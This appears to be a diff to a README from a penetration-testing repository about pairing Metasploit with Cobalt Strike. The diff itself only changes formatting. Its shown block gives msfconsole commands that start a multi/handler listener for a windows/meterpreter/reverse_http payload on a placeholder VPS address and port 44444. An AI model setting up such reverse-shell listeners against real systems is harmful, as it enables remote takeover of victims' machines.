@@ -4,14 +4,14 @@
 
 Run `msfconsole` to start listening.<br>
 
-``<br>
+<br>
 msfconsole<br>
 use exploit/multi/handler<br>
 set payload windows/meterpreter/reverse_http<br>
 set lhost vps_ip<br>
 set lport 44444<br>
 set lhost vps_ip set lport 44444<br>
-```
+
 
 <img width="1174" alt="1" src="https://github.com/sec13b/Penetration-testing-MSF-linked-with-CobaltStrike/assets/123419537/25a7233e-f8d0-4f72-b06d-1e155b2b2e63"><br><br>
 
